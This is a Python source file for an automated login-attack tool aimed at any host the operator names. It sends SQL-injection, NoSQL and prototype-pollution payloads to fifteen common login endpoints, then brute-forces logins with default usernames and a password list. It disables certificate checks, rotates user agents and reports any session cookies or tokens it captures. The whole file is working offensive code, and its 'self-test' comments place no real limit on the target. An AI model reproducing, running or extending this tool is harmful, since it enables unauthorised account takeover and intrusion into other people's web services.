import asyncio
import socket
import ssl
import time
import sys
import json
import http.client
import random

_ssl_context = ssl.create_default_context()
_ssl_context.check_hostname = False
_ssl_context.verify_mode = ssl.CERT_NONE

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
]

LOGIN_PATHS = [
    "/api/auth/callback/credentials",
    "/api/auth/login",
    "/api/auth/signin",
    "/api/v1/auth/login",
    "/api/v1/users/login",
    "/api/login",
    "/api/signin",
    "/api/session",
    "/login",
    "/signin",
    "/auth/login",
    "/auth",
    "/user/login",
    "/admin/login",
    "/api/admin/login",
]

USERNAMES = [
    "admin", "Admin", "administrator", "root", "test", "user",
    "demo", "support", "ops", "dev", "info", "contact",
]


def _request(host, path, payload, method="POST", extra_headers=None, port=443, use_ssl=True):
    try:
        conn = (
            http.client.HTTPSConnection(host, port, context=_ssl_context, timeout=8.0)
            if use_ssl
            else http.client.HTTPConnection(host, port, timeout=8.0)
        )
        headers = {
            "Host": host,
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Origin": f"https://{host}",
            "Referer": f"https://{host}/login",
            "Connection": "close",
        }
        if extra_headers:
            headers.update(extra_headers)
        body = json.dumps(payload) if isinstance(payload, (dict, list)) else str(payload)
        conn.request(method, path, body.encode("utf-8"), headers)
        resp = conn.getresponse()
        data = resp.read(500_000).decode("utf-8", errors="ignore")
        hdrs = {k: v for k, v in resp.getheaders()}
        status = resp.status
        conn.close()
        return status, hdrs, data, None
    except Exception as e:
        return 0, {}, "", str(e)


def _is_likely_success(status, headers, body):
    bl = (body or "").lower()
    set_cookie = headers.get("Set-Cookie", "") or headers.get("set-cookie", "")
    sc = set_cookie.lower()

    # Hard failures
    if status in (401, 403, 429):
        return False, "AUTH_REJECT"
    if any(x in bl for x in ("invalid password", "invalid credentials", "login failed", "unauthorized", "wrong password")):
        return False, "AUTH_REJECT"

    # SQL / injection errors = interesting, not "login success"
    sql_errs = ("sql syntax", "mysql_", "pg_query", "sqlite3.", "mongodb", "syntax error", "ora-009")
    for e in sql_errs:
        if e in bl:
            return True, f"INJECTION_ERROR:{e}"

    # Session indicators with non-fail body
    has_sess = any(k in sc for k in ("session", "token", "jwt", "auth", "connect.sid", "next-auth"))
    if status in (200, 201, 302) and has_sess:
        if not any(x in bl for x in ("invalid", "unauthorized", "failed", "error")):
            return True, "SESSION_COOKIE_ISSUED"

    if status in (200, 201) and any(k in bl for k in ("\"token\"", "\"accessToken\"", "\"access_token\"", "\"jwt\"")):
        if "invalid" not in bl:
            return True, "TOKEN_IN_BODY"

    return False, "NO_HIT"


async def run_autonomous_engine(target_host, credentials_list=None, options=None):
    """
    Auth + injection assault against target_host (operator-supplied at runtime).
    Uses wordlist for real credential attempts + classic injection payloads.
    HTTP speaks to the domain (Host/SNI), not a bare IP.
    """
    sys.stdout.write(f"\n\033[95m[***] AUTH / INJECTION ENGINE → {target_host} [***]\033[0m\n")
    sys.stdout.flush()

    try:
        ip = socket.gethostbyname(target_host)
        sys.stdout.write(f"\033[96m[*] DNS {target_host} → {ip}\033[0m\n")
        sys.stdout.flush()
    except socket.gaierror:
        sys.stdout.write(f"\033[91m[!] DNS failed for {target_host}\033[0m\n")
        return [], 0.0

    passwords = credentials_list or ["admin", "password", "Password123", "admin123"]
    # Cap for speed on self-test; full list still used in slices
    passwords = passwords[:80]

    start = time.time()
    hits = []

    # --- Phase A: injection probes (fast) ---
    inj_payloads = []
    for uk in ("username", "email", "user", "login"):
        for pk in ("password", "pass", "pwd"):
            inj_payloads.append({uk: "admin' OR '1'='1' --", pk: "x"})
            inj_payloads.append({uk: {"$ne": None}, pk: {"$ne": None}})
            inj_payloads.append({uk: "admin", pk: "admin", "__proto__": {"isAdmin": True}})

    for path in LOGIN_PATHS:
        for payload in inj_payloads:
            status, headers, body, err = await asyncio.to_thread(_request, target_host, path, payload)
            if err or status == 0:
                continue
            ok, reason = _is_likely_success(status, headers, body)
            if status not in (0, 404):
                sys.stdout.write(f"\033[90m  [{status}] INJ {path}\033[0m\n")
                sys.stdout.flush()
            if ok:
                hit = {
                    "type": reason,
                    "endpoint": path,
                    "payload": payload,
                    "status": status,
                    "cookies": headers.get("Set-Cookie", "")[:200],
                    "body_snip": (body or "")[:300],
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                }
                sys.stdout.write(f"\n\033[1m\033[91m[***] HIT {reason} @ {path} [***]\033[0m\n")
                sys.stdout.flush()
                hits.append(hit)
                return hits, time.time() - start

    # --- Phase B: real wordlist credential stuffing (offensive self-test) ---
    sys.stdout.write(f"\033[93m[*] Wordlist phase: {len(USERNAMES)} users × {len(passwords)} passwords\033[0m\n")
    sys.stdout.flush()
    attempts = 0
    for path in LOGIN_PATHS[:8]:
        for user in USERNAMES:
            for pwd in passwords:
                attempts += 1
                payload = {"email": user, "username": user, "password": pwd}
                # also form-style key sets
                status, headers, body, err = await asyncio.to_thread(_request, target_host, path, payload)
                if err or status == 0:
                    continue
                if attempts % 25 == 0:
                    sys.stdout.write(f"\033[90m  … {attempts} attempts (last {status} {path})\033[0m\n")
                    sys.stdout.flush()
                ok, reason = _is_likely_success(status, headers, body)
                if ok and reason != "INJECTION_ERROR":
                    hit = {
                        "type": reason,
                        "endpoint": path,
                        "payload": {"username": user, "password": pwd},
                        "status": status,
                        "cookies": headers.get("Set-Cookie", "")[:200],
                        "body_snip": (body or "")[:300],
                        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                    }
                    sys.stdout.write(f"\n\033[1m\033[91m[***] CRED HIT {user}:{pwd} @ {path} ({reason}) [***]\033[0m\n")
                    sys.stdout.flush()
                    hits.append(hit)
                    return hits, time.time() - start
                # soft rate limit politeness on own box
                if attempts % 10 == 0:
                    await asyncio.sleep(0.05)

    duration = time.time() - start
    sys.stdout.write(f"\n\033[33m[*] Auth engine done in {duration:.2f}s | attempts={attempts} | hits={len(hits)}\033[0m\n")
    sys.stdout.flush()
    return hits, duration
